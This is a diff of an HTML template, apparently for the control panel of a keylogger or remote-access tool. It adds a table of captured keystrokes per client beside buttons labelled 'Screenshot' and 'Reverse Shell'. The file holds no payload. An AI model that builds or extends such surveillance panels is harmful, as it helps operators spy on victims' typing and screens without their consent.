@@ -49,95 +49,86 @@
             <button class="btn btn-secondary btn-command" type="button" data-uuid="<%= single_client.uuid %>" data-command="screenshot">Screenshot</button>
             <button class="btn btn-secondary btn-command" type="button" data-uuid="<%= single_client.uuid %>" data-command="reverse-shell">Reverse Shell</button>
         </div>
-
-        <div class="row mt-5 justify-content-around">
-            <div class="card col-6">
-                <div class="card-header">Logs</div>
-                <div class="card-body">
-                    <table class="table table-striped table-hover table-light">
-                        <thead class="thead-dark">
-                            <tr>
-                                <th scope="col">ID</th>
-                                <th scope="col">Application</th>
-                                <th scope="col">Logs</th>
-                                <th scope="col">Date</th>
-                                <th scope="col">Path ???</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <th scope="row">1</th>
-                                <td>Chrome (Test)</td>
-                                <td>Comment devenir riche ?</td>
-                                <td>2021-06-23 12:00</td>
-                                <td>Chemin ?</td>
-                            </tr>
-                            <tr>
-                                <th scope="row">1</th>
-                                <td>Chrome (Test)</td>
-                                <td>Comment devenir riche ?</td>
-                                <td>2021-06-23 12:00</td>
-                                <td>Chemin ?</td>
-                            </tr>
-                            <tr>
-                                <th scope="row">1</th>
-                                <td>Chrome (Test)</td>
-                                <td>Comment devenir riche ?</td>
-                                <td>2021-06-23 12:00</td>
-                                <td>Chemin ?</td>
-                            </tr>
-                            <tr>
-                                <th scope="row">1</th>
-                                <td>Chrome (Test)</td>
-                                <td>Comment devenir riche ?</td>
-                                <td>2021-06-23 12:00</td>
-                                <td>Chemin ?</td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
+        <div id="commandSent" class="text-center mt-2">
+            <div class="btn btn-success">
+                Command successfully added to the queue !
             </div>
+        </div>
 
-            <div class="card col-6">
-                <div class="card-header">Screenshots</div>
-                <div class="card-body">
-                    <table class="table table-striped table-hover table-light">
-                        <thead class="thead-dark">
+        <div class="card mt-5">
+            <div class="card-header">Logs</div>
+            <div class="card-body">
+                <table class="table table-striped table-hover table-light table-responsive">
+                    <thead class="thead-dark">
+                        <tr>
+                            <th scope="col">ID</th>
+                            <th scope="col">Application</th>
+                            <th scope="col">Logs</th>
+                            <th scope="col">Date</th>
+                            <th scope="col">Path ???</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <% for (let k in keylogs ) { 
+                            const yearLog = keylogs[k].datetime.getFullYear()
+                            const monthLog = (keylogs[k].datetime.getMonth() <= 9 ? '0' : '') + (keylogs[k].datetime.getMonth() + 1)
+                            const dayLog = keylogs[k].datetime.getDate()
+                            const hoursLog = (keylogs[k].datetime.getHours() <= 9 ? '0' : '') + (keylogs[k].datetime.getHours())
+                            const minutesLog = (keylogs[k].datetime.getMinutes() <= 9 ? '0' : '') + (keylogs[k].datetime.getMinutes()) 
+                            const logDate = yearLog + '-' + monthLog + '-' + dayLog + ' ' + hoursLog + ':' + minutesLog
+                        %>
                             <tr>
-                                <th scope="col">ID</th>
-                                <th scope="col">Aperçu</th>
-                                <th scope="col">File name</th>
-                                <th scope="col">Date</th>
+                                <th scope="row"><%= keylogs[k].id %></th>
+                                <td><%= keylogs[k].application %></td>
+                                <td><%= keylogs[k].logs %></td>
+                                <td><%= logDate %></td>
+                                <td><%= keylogs[k].path %></td>
                             </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <th scope="row">1</th>
-                                <td>Mini image (si faisable)</td>
-                                <td>Ligne cliquable pour agrandir image</td>
-                                <td>2021-06-23 12:00</td>
-                            </tr>
-                            <tr>
-                                <th scope="row">1</th>
-                                <td>Mini image (si faisable)</td>
-                                <td>Ligne cliquable pour agrandir image</td>
-                                <td>2021-06-23 12:00</td>
-                            </tr>
-                            <tr>
-                                <th scope="row">1</th>
-                                <td>Mini image (si faisable)</td>
-                                <td>Ligne cliquable pour agrandir image</td>
-                                <td>2021-06-23 12:00</td>
-                            </tr>
-                            <tr>
-                                <th scope="row">1</th>
-                                <td>Mini image (si faisable)</td>
-                                <td>Ligne cliquable pour agrandir image</td>
-                                <td>2021-06-23 12:00</td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
+                        <% } %>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="card mt-5">
+            <div class="card-header">Screenshots</div>
+            <div class="card-body">
+                <table class="table table-striped table-hover table-light">
+                    <thead class="thead-dark">
+                        <tr>
+                            <th scope="col">ID</th>
+                            <th scope="col">Aperçu</th>
+                            <th scope="col">File name</th>
+                            <th scope="col">Date</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <th scope="row">1</th>
+                            <td>Mini image (si faisable)</td>
+                            <td>Ligne cliquable pour agrandir image</td>
+                            <td>2021-06-23 12:00</td>
+                        </tr>
+                        <tr>
+                            <th scope="row">1</th>
+                            <td>Mini image (si faisable)</td>
+                            <td>Ligne cliquable pour agrandir image</td>
+                            <td>2021-06-23 12:00</td>
+                        </tr>
+                        <tr>
+                            <th scope="row">1</th>
+                            <td>Mini image (si faisable)</td>
+                            <td>Ligne cliquable pour agrandir image</td>
+                            <td>2021-06-23 12:00</td>
+                        </tr>
+                        <tr>
+                            <th scope="row">1</th>
+                            <td>Mini image (si faisable)</td>
+                            <td>Ligne cliquable pour agrandir image</td>
+                            <td>2021-06-23 12:00</td>
+                        </tr>
+                    </tbody>
+                </table>
             </div>
         </div>
 
